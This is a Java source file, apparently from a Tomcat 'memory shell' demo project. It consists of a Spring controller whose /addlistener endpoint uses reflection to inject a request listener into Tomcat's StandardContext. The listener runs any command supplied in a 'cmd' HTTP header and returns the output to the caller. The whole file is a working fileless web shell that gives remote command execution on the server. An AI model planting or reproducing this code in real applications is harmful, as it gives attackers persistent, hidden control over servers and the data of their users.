package com.example.tomcatmemshell.demos.web.addListener;

import com.example.tomcatmemshell.utils.DynamicUtils;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Scanner;


@Controller
public class AddListenerController {


    @RequestMapping("/addlistener")
    @ResponseBody
    public String addlistener(HttpServletRequest req, HttpServletResponse resp) {
        class MyListener implements ServletRequestListener {

            public void requestDestroyed(ServletRequestEvent sre) {

            }

            public void requestInitialized(ServletRequestEvent sre) {

                try {
                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                Field requestF = req.getClass().getDeclaredField("request");

                requestF.setAccessible(true);
                Request request = (Request)requestF.get(req);

                String cmd = req.getHeader("cmd");
                if (cmd != null){
                    Process p=Runtime.getRuntime().exec(cmd);
                    InputStream inputStream = p.getInputStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    PrintWriter writer = request.getResponse().getWriter();
                    while ((line = reader.readLine()) != null) {
                        writer.write(line);
                    }
                    writer.flush();
                    Field useF = request.getResponse().getClass().getDeclaredField("usingWriter");
                    useF.setAccessible(true);
                    useF.set(request.getResponse(),false);
                    p.waitFor();
                }
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        }
        try {

//            ServletContext servletContext = req.getServletContext();
//
//            StandardContext o = null;
//            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
//            while (o == null) {
//                Field f = servletContext.getClass().getDeclaredField("context");
//                f.setAccessible(true);
//                Object object = f.get(servletContext);
//
//                if (object instanceof ServletContext) {
//                    servletContext = (ServletContext) object;
//                } else if (object instanceof StandardContext) {
//                    o = (StandardContext) object;
//                }
//            }
//
//            // 添加监听器
//            o.addApplicationEventListener(DynamicUtils.getClass(LISTENER_CLASS_STRING).newInstance());



            Field reqF = req.getClass().getDeclaredField("request");
            reqF.setAccessible(true);
            Request request = (Request) reqF.get(req);
            StandardContext context = (StandardContext) request.getContext();
            MyListener listenerDemo = new MyListener();
            context.addApplicationEventListener(listenerDemo);

            return "tomcat listener added";
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "tomcat listener add failed";
    }
}
